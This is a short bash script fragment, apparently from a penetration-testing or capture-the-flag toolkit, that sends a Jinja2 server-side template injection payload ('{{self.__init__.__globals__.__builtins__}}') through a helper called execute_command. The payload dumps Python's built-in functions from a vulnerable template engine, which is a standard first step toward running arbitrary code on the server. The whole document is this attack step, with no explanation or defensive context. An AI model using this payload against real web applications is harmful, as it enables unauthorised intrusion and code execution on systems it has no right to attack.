#!/bin/bash

: '
SSTI - dump jinja2 build in functions
'

execute_command "{{self.__init__.__globals__.__builtins__}}"
